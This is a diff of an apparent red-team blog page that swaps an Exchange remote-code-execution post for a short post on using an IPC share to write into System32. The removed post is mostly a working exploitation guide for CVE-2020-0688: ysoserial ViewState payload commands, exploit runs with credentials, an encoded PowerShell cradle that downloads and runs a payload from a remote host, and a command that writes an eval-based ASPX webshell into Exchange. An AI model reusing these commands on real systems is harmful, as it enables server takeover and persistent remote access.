@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Exchange RCE methods, Yangsir">
+    <meta name="keywords" content="Use IPC BypassUAC, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Exchange RCE methods | Yangsir</title>
+    <title>Use IPC BypassUAC | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.37.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Use%20IPC%20BypassUAC/image-20210808150507232.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Exchange RCE methods</h1>
+                    <h1 class="description center-align post-title">Use IPC BypassUAC</h1>
                 </div>
             </div>
         </div>
@@ -432,28 +432,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Redteam/">
-                                <span class="chip bg-color">Redteam</span>
+                            <a href="/tags/Bypass/">
+                                <span class="chip bg-color">Bypass</span>
                             </a>
                         
-                            <a href="/tags/Exchange/">
-                                <span class="chip bg-color">Exchange</span>
+                            <a href="/tags/UAC/">
+                                <span class="chip bg-color">UAC</span>
                             </a>
                         
-                            <a href="/tags/RCE/">
-                                <span class="chip bg-color">RCE</span>
-                            </a>
-                        
-                            <a href="/tags/CVE-2020-17144/">
-                                <span class="chip bg-color">CVE-2020-17144</span>
-                            </a>
-                        
-                            <a href="/tags/CVE-2020-16875/">
-                                <span class="chip bg-color">CVE-2020-16875</span>
-                            </a>
-                        
-                            <a href="/tags/CVE-2020-0688/">
-                                <span class="chip bg-color">CVE-2020-0688</span>
+                            <a href="/tags/IPC/">
+                                <span class="chip bg-color">IPC</span>
                             </a>
                         
                     </div>
@@ -464,8 +452,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Learning-record/" class="post-category">
-                                Learning record
+                            <a href="/categories/Tips/" class="post-category">
+                                Tips
                             </a>
                         
                     </div>
@@ -477,28 +465,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-29
+                    2021-08-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-07-29
+                    2021-08-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.5k
+                    124
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    9 Min
+                    1 Min
                 </div>
                 
 
@@ -521,213 +509,30 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Get-exchange-version"><a href="#Get-exchange-version" class="headerlink" title="Get exchange version"></a>Get exchange version</h2><pre class="line-numbers language-none"><code class="language-none">You can get some thing about version
-https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;exchange&#x2F;new-features&#x2F;build-numbers-and-release-dates?view&#x3D;exchserver-2016<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+                <h6 id="After-the-actual-test-some-environments-can-be-successful"><a href="#After-the-actual-test-some-environments-can-be-successful" class="headerlink" title="After the actual test, some environments can be successful"></a>After the actual test, some environments can be successful</h6><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">In many scenarios<span class="token punctuation">,</span> you <span class="token keyword">do</span> not have <span class="token function">write</span> permission to the system directory<span class="token punctuation">.</span> Here you will use this method to obtain <span class="token function">write</span> permission to the file
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.30.59.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Check the source code below, and compare the official website to confirm the relevant version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+C:\Windows\System32>net use A: \\127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1\c$
+命令成功完成。
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.31.04.png"></p>
-<h2 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：
-https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;nVtE-OFoO076x6T0147AMw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+C:\Windows\System32>A:
 
-<h3 id="Impact-amp-Fix"><a href="#Impact-amp-Fix" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:
-exchange2010
-Fix:
-https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-17144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+A:\>cd Windows\System32
 
-<h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">You can use these exp
-https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-17144
-https:&#x2F;&#x2F;github.com&#x2F;Airboi&#x2F;CVE-2020-17144-EXP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+A:\Windows\System32><span class="token function">echo</span> test >test111
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.31.10.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.31.56.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Another can write Memory shell：http:&#x2F;&#x2F;192.168.159.143&#x2F;ews&#x2F;soap&#x2F;?pass&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+A:\Windows\System32><span class="token function">dir</span> test111
+ 驱动器 A 中的卷没有标签。
+ 卷的序列号是 4C43<span class="token operator">-</span>ED5B
 
-<h2 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h2><h3 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：
-Incorrect validation of cmDlet parameters and a remote execution code vulnerability in the Microsoft Exchange server. An attacker who successfully exploits this vulnerability can run arbitrary code in the context of a system user. To exploit this vulnerability, you need to have the user rights to authenticate with an Exchange role. Since the Exchange service runs with the System rights, you can also obtain the highest System rights by triggering this vulnerability
-Note：
-The target user must have the data Loss Prevention permission. Usually, the user in the Exchange Security Groups has the data Loss Prevention permission.
-Members of exchange Security Groups are usually Exchange administrators
-Other users in the organization can also use this interface to execute commands<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+ A:\Windows\System32 的目录
 
-<h3 id="Impact-amp-Fix-1"><a href="#Impact-amp-Fix-1" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:
-exchange2016 cu16、cu17
-exchange2019 cu5、cu6
-Fix:
-https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-16875<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+2021<span class="token operator">/</span>08<span class="token operator">/</span>08  15:01                 7 test111
+               1 个文件              7 字节
+               0 个目录 31<span class="token punctuation">,</span>098<span class="token punctuation">,</span>544<span class="token punctuation">,</span>128 可用字节
 
-<h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">Interfaces involving commands
-&#x2F;ecp&#x2F;DLPpolicy&#x2F;ManagePolicyFromISV.aspx 0688 holes have a regular user of ecp access permissions to delete
-&#x2F;PowerShell  This interface is used by exchange administrators. This interface cannot be invoked by non-Exchange Seucity Groups members and can only be used for Kerberos authentication
+A:\Windows\System32><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-msf use：
-https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;pull&#x2F;14126
-
-You can use these exp：
-https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.ps1.txt
-https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16875.py.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.03.png"></p>
-<h2 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h2><h3 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">Principle：
-https:&#x2F;&#x2F;www.t00ls.net&#x2F;viewthread.php?tid&#x3D;55183
-
-The vulnerability was found in the Exchange Control Panel (ECP) component. Instead of generating random keys with each software installation, all Microsoft Exchange Servers have the same validationKey and decryptionKey in the web.config file after installation. These keys are used to secure ViewState. ViewState, on the other hand, is server-side data that an ASP.NET Web application stores on the client in a serialized format. The client returns this data to the server with the __VIEWSTATE request parameter.
-
-Thanks to the use of static keys, an authenticated attacker can trick the target server into deserializing maliciously created ViewState data. With the help of YSoSerial.net, an attacker can execute any.NET code on the Exchange Control Panel Web application. To exploit this vulnerability, we need to collect the ViewStateUserKey and VIEWSTATEGENERATOR values from the authenticated session. The ViewStateUserKey can be retrieved from the ASP.NET cookie, and the VIEWSTATEGENERATOR can be found in a hidden field. All of these can be easily found through tools in your browser.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Impact-amp-Fix-2"><a href="#Impact-amp-Fix-2" class="headerlink" title="Impact&amp;Fix"></a>Impact&amp;Fix</h3><pre class="line-numbers language-none"><code class="language-none">Impact:
-exchange2010 Service Pack 3
-exchange2013
-exchange2016
-exchange2019
-Fix:
-https:&#x2F;&#x2F;msrc.microsoft.com&#x2F;update-guide&#x2F;vulnerability&#x2F;CVE-2020-0688<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="Actual-use-2"><a href="#Actual-use-2" class="headerlink" title="Actual use"></a>Actual use</h3><h4 id="Manual-use"><a href="#Manual-use" class="headerlink" title="Manual use"></a>Manual use</h4><pre class="line-numbers language-none"><code class="language-none">Several values are required here:
-CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF validationKey as default
-Configuration file C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\web.config can be found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.10.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Validationalg is the default SHA1
-__VIEWSTATEGENERATOR is B97B4E27 (available via &#x2F;ecp&#x2F;default.aspx return package, which may have the same value, or it may not be included in the package. Patch KB2919355 is updated with this field, but B97B4E27 is the default)
-ASP.NET_SessionId: 48fbc032-7ab9-405b-a6c2-c7d78b3ef318 (you can get it from cookie)
-
-Use the ysoserial construct statement
-ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;command&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;48fbc032-7ab9-405b-a6c2-c7d78b3ef318&quot; --isdebug –islegacy
-
-you will get these:
-&#x2F;wEy2gYAAQAAAP&#x2F;&#x2F;&#x2F;&#x2F;8BXXXXXXXXXXXXXXXXXXXXXXXXXXXXTz&#x2F;2z4qo6iw&#x3D;&#x3D;
-
-then use the url to encode payload add our url you can get these:
-https:&#x2F;&#x2F;192.168.3.144&#x2F;ecp&#x2F;default.aspx?__VIEWSTATEGENERATOR&#x3D;B97B4E27&amp;__VIEWSTATE&#x3D;%2FwEy2gYAAQAAAPXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxTz%2F2z4qo6iw%3D%3D
-
-go to visit the dns log you will known success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.16.png"></p>
-<h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><pre class="line-numbers language-none"><code class="language-none">EXP
-https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;cve-2020-0688
-
-python3 cve-2020-0688.py -s https:&#x2F;&#x2F;192.168.3.144&#x2F;owa -u micle -p Admin12345 -c &quot;ping t00ls.XXXXX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.41.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">use the ysoserial
-ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping t00ls.XXXXX&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;ea98fbf7-951b-4885-8fb3-00f2cf3a2e73&quot; --isdebug –islegacy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.32.59.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">go to payload <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.19.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">your web code should become 500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.24.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">confirm the dns log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.29.png"></p>
-<h4 id="CS-online"><a href="#CS-online" class="headerlink" title="CS online"></a>CS online</h4><pre class="line-numbers language-none"><code class="language-none">use powershell
-powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.3.11:801&#x2F;aa&#39;))&quot;
-
-you must encode your powershell code，you can get like this
-powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAzAC4AMQAxADoAOAAwADEALwBhAGEAJwApACkAIgA&#x3D;
-
-the same way to use 
-python3 cve-2020-0688.py -s https:&#x2F;&#x2F;192.168.3.144&#x2F;owa -u micle -p Admin12345 -c &quot;cmd  &#x2F;c powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAzAC4AMQAxADoAOAAwADEALwBhAGEAJwApACkAIgA&#x3D;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.39.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">confir success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.45.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">the same way to use the exe program<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.33.57.png"></p>
-<h4 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h4><pre class="line-numbers language-none"><code class="language-none">EXP
-https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;CVE-2020-0688&#x2F;
-
-This EXP need the .net environment
-
-ExchangeDetect.exe 192.168.3.144 micle Admin12345
-ExchangeCmd.exe 192.168.3.144 micle Admin12345
-
-success like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.07.png"></p>
-<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><pre class="line-numbers language-none"><code class="language-none">If you can get an interactive shell then you can maybe to get a webshell 
-
-First, you must find web dir exec cmd.exe &#x2F;c echo %ExchangeInstallPath%
-
-Then, you can write the webshell to aspx
-exec cmd.exe &#x2F;c echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;xx&quot;],&quot;unsafe&quot;);%^&gt;&gt;&quot;C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\LiveIdError.aspx&quot;
-
-success like this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.16.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">confirm this is system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.23.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Principle you must write the aspxshell into to the webconfig，but I find other file also to be success like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.29.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">you can also write into the iis web application dir, like this you we have a webshell 
-
-Note: if you write the shell in the ecp dir, you must use cookie to connect，if you write the shell in the owa dir like this, you don&#39;t need the cookie to connect!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.37.png"></p>
-<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre class="line-numbers language-none"><code class="language-none">maybe in your PC, you don&#39;t have the py environment，you can use the powershell to success, like this to use the calc.exe
-exchange -s https:&#x2F;&#x2F;192.168.3.144&#x2F; -u micle@rootkit.org -p Admin12345 -c calc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.42.png"></p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.56.png"></p>
-<h3 id="Another-can-be-use-dir-amp-VIEWSTATEGENERATOR"><a href="#Another-can-be-use-dir-amp-VIEWSTATEGENERATOR" class="headerlink" title="Another can be use dir &amp; __VIEWSTATEGENERATOR"></a>Another can be use dir &amp; __VIEWSTATEGENERATOR</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;1D01FD4E
-
-&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;1D01FD4E
-
-&#x2F;ecp&#x2F;Organize&#x2F;AutomaticReplies.slab?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;FD338EE0
-
-&#x2F;ecp&#x2F;RulesEditor&#x2F;InboxRules.slab?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;FD338EE0
-
-&#x2F;ecp&#x2F;Organize&#x2F;DeliveryReports.slab?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;FD338EE0
-
-&#x2F;ecp&#x2F;MyGroups&#x2F;PersonalGroups.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;A767F62B
-
-&#x2F;ecp&#x2F;MyGroups&#x2F;ViewDistributionGroup.aspx?pwmcid&#x3D;1&amp;id&#x3D;38f4bec5-704f-4272-a654-95d53150e2ae&amp;ReturnObjectType&#x3D;1
-__VIEWSTATEGENERATOR&#x3D;321473B8
-
-&#x2F;ecp&#x2F;Customize&#x2F;Messaging.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;9C5731F0
-
-&#x2F;ecp&#x2F;Customize&#x2F;General.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;72B13321
-
-&#x2F;ecp&#x2F;Customize&#x2F;Calendar.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;4AD51055
-
-&#x2F;ecp&#x2F;Customize&#x2F;SentItems.aspx?showhelp&#x3D;false&amp;
- __VIEWSTATEGENERATOR&#x3D;4466B13F
-
-&#x2F;ecp&#x2F;PersonalSettings&#x2F;Password.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;59543DCA
-
-&#x2F;ecp&#x2F;SMS&#x2F;TextMessaging.slab?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;FD338EE0
-
-&#x2F;ecp&#x2F;TroubleShooting&#x2F;MobileDevices.slab?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;FD338EE0
-
-&#x2F;ecp&#x2F;Customize&#x2F;Regional.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;9097CD08
-
-&#x2F;ecp&#x2F;MyGroups&#x2F;SearchAllGroups.slab?pwmcid&#x3D;3&amp;ReturnObjectType&#x3D;1
-__VIEWSTATEGENERATOR&#x3D;FD338EE0
-
-&#x2F;ecp&#x2F;Security&#x2F;BlockOrAllow.aspx?showhelp&#x3D;false&amp;
-__VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Use%20IPC%20BypassUAC/image-20210808150507232.png"></p>
 
                 
             </div>
@@ -754,7 +559,7 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/29/exchange-rce-methods/">https://yangsirrr.github.io/2021/07/29/exchange-rce-methods/</a>
+                    <a href="https://yangsirrr.github.io/2021/08/08/use-ipc-bypassuac/">https://yangsirrr.github.io/2021/08/08/use-ipc-bypassuac/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -792,28 +597,16 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Redteam/">
-                                    <span class="chip bg-color">Redteam</span>
+                                <a href="/tags/Bypass/">
+                                    <span class="chip bg-color">Bypass</span>
                                 </a>
                             
-                                <a href="/tags/Exchange/">
-                                    <span class="chip bg-color">Exchange</span>
+                                <a href="/tags/UAC/">
+                                    <span class="chip bg-color">UAC</span>
                                 </a>
                             
-                                <a href="/tags/RCE/">
-                                    <span class="chip bg-color">RCE</span>
-                                </a>
-                            
-                                <a href="/tags/CVE-2020-17144/">
-                                    <span class="chip bg-color">CVE-2020-17144</span>
-                                </a>
-                            
-                                <a href="/tags/CVE-2020-16875/">
-                                    <span class="chip bg-color">CVE-2020-16875</span>
-                                </a>
-                            
-                                <a href="/tags/CVE-2020-0688/">
-                                    <span class="chip bg-color">CVE-2020-0688</span>
+                                <a href="/tags/IPC/">
+                                    <span class="chip bg-color">IPC</span>
                                 </a>
                             
                         </div>
@@ -859,16 +652,17 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/07/30/exchange-export-email-methods/">
+                <a href="/2021/08/08/use-ipc-bypassuac/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png" class="responsive-img" alt="Exchange Export email methods">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Use%20IPC%20BypassUAC/image-20210808150507232.png" class="responsive-img" alt="Use IPC BypassUAC">
                         
-                        <span class="card-title">Exchange Export email methods</span>
+                        <span class="card-title">Use IPC BypassUAC</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -878,9 +672,9 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -893,27 +687,20 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Redteam/">
-                        <span class="chip bg-color">Redteam</span>
+                    <a href="/tags/Bypass/">
